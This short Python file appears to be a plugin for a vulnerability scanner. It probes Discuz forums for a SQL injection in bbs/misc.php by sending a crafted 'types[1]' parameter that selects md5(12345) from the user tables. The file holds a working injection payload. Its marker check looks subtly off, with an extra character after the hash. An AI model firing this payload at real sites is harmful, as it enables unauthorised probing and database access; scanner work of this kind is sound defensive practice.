#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'K0thony'
import requests

def assign(service, arg): 
    if service == "discuz": 
      return True, arg 
def audit(arg):
    payload = 'bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=password`as%20statistic%20(select%20(select%20md5(12345)%20from%20pre_common_statuser,pre_ucenter_members%20as' 
    verify_url = arg + payload

    try:
        req = requests.get(verify_url)
        if req.status_code == 200 and "827ccb0eea8a706c4c34a16891f84e7b1" in req.content:
            security_hole(verify_url)
    except requests.Timeout:
        pass


# if __name__ == '__main__': 
#     from dummy import * 
#     audit(assign('discuz', 'http://www.example.com/')[1])
from hackhttp import hackhttp
from func import *